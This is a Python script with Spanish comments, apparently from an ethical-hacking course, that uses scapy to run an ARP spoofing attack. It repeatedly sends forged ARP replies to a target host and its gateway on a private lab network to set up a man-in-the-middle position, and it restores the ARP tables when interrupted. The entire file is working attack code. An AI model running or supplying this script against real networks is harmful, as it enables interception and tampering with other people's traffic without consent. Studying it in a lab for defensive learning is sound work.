#!/usr/bin/env python

import scapy.all as scapy
import time


def get_mac(ip):

    # Devuelve la mac usando el protocolo ARP se envia un mensaje de tipo broadcast con la ip
    # Para acceder y esta conesta devolviendo la mac.
    # scapy.arping(ip)


    # scapy.ARP crea un objeto que represemta un tipo paquete ARP
    # arp_request contiene la instancia del objeto paquete ARP
    # 1 Usando ARP para preguntar quienn es la ip objetivo
    arp_request = scapy.ARP(pdst=ip)
    # sow muestra mas informacion
    # arp_request.show()

    # Crea una instancia de un objeto de tipo Eter
    # 2.- Usado para poner la MAC destino como broadcast MAC
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # broadcast.show()
    # !! Modificamos el ip al que va dirigido otra forma es desde que se instancia hacerlo. ver arriba.
    # arp_request.pdst=ip


    # !! Imprimimos el resultado de los metodos
    # print(arp_request.summary())
    # print(broadcast.summary())

    # !! Combinamos los dos objetos
    arp_request_broadcast = broadcast/arp_request
    # Mandar un paquete con un mac customizado lo permite el metodo srp
    # retorna una pareja de dos listas, el primer elemento de la lista de parejas es
    # (packet sent, answer) y el segundo de la lista son los paquetes sin responder, ya que
    # no nos interesan los unanswered se pueden quitar pero se tiene que referenciar a solo el
    # elemento 1 es decir 0 de la lista.
    # Verbose da informacion sobre paquetes enviados, recibidos, e ignorados.
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # T1 Imprimimos lo que nos dio de la variable combinada el metodo summary.
    # print(answered_list.summary())
    # arp_request_broadcast.show()



    # !! El metodo ls lista los metodos que oueden ser modificados, como ip destino para hacer el broadcast, mac, etc.
    # scapy.ls(scapy.ARP())
    # scapy.ls(scapy.Ether())


    #Para no imprimir todo el summary de las respuestas T1
    #se hace lo siguiente.

    return (answered_list[0][1].hwsrc)
    #Solo nos interesa el elemento 0 para obtener lo relacionado con la mac del router y como es la mac no la ip es 1

def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    # si op es 1 manda un ARP request
    # si op es 2 manda un ARP response op=is-at
    # psrc nos sirve para fingir que la ip que ocuparemos sera la del router con la mac de esta maquina
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet,verbose = False)

def restore(dst_ip, src_ip):
    dstmac=get_mac(dst_ip)
    source_mac=get_mac(src_ip)
    # Paresido a spoof pero en vez de asignar manual la hwsrc con la mac de kali le ponemos la mac del router
    packet=scapy.ARP(op=2, pdst=dst_ip, hwdst=dstmac, psrc=src_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "10.0.2.15"
gateway_ip = "10.0.2.1"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print(" \r [+] Packet sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:

    print("[+] CTRL + C ..... Reseteando tabla ARP.... espera")
    restore(target_ip, gateway_ip)
    restore(gateway_ip,target_ip)